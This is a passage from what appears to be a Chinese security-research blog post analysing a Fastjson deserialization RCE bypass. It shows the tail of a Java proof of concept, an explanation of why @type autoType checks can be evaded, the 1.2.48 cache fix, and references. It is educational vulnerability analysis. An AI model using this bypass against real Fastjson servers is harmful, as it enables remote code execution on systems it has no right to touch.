class="hljs-string">&quot;&#125;&quot;</span> +<br>            <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        <span class="hljs-comment">// 模拟受害的fastjson服务器</span><br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>调试 看一下调用栈</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250323124048401.png" alt="image-20250323124048401"></p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250323124459725.png" alt="image-20250323124459725"></p><p>成功执行命令</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250323125747444.png" alt="image-20250323125747444"></p><blockquote><p>你是不仍有疑问，为什么我把 AutoTypeSupport 关了，在 json 串里也用到了@type 字段，为什么还能进行封装呢？</p><p>其实 autoTypeSupport 只是一个布尔值，在 checkAutoType() 函数中仅仅时进行了一些列 if 判断，他并不是把fastjson的@type特性给移除掉了。而我们 既没有在 autoTypeSupport 为true的方法里执行，也没有在autoTypeSupport 为false的方法里执行，所以可以实现RCE绕过</p></blockquote><h3 id="1-2-48"><a href="#1-2-48" class="headerlink" title="1.2.48"></a>1.2.48</h3><p>官方在 1.2.48 对漏洞进行了修复，在 <code>MiscCodec</code> 处理 Class 类的地方，设置了cache 为 false ，并且 <code>loadClass</code> 重载方法的默认的调用改为不缓存，这就避免了使用了 Class 提前将恶意类名缓存进去。</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250323184839413.png" alt="image-20250323184839413"></p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250323185108496.png" alt="image-20250323185108496"></p><p>这也确实把我们想通过缓存的路给封死了</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>fastjson从1.2.24开始爆出RCE后就一发不可收拾，各种绕过接踵而至。作者也是在缝缝补补，不过靠黑名单机制肯定是不足够安全的，会有研究人员不断找出新的路径来实现bypass。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://goodapple.top/archives/832">Java 安全学习——Fastjson 反序列化漏洞 - 枫 のBlog</a></p><p><a href="https://www.javasec.org/java-vuls/FastJson.html">Fastjson 反序列化漏洞 · 攻击 Java Web 应用-Java Web 安全</a></p><p><a href="https://tttang.com/archive/1579/">Fastjson 反序列化分析 - 跳跳糖</a></p><p><a href="https://dililearngent.github.io/2023/02/10/fastjson-security/">Java 安全之 FastJson 漏洞分析与利用 | DiliLearngent’s Blog</a></p>]]></content>
    
    
    <categories>
      
      <category>java安全</category>
      
      <category>fastjson系列</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java安全</tag>
      
      <tag>fastjson反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
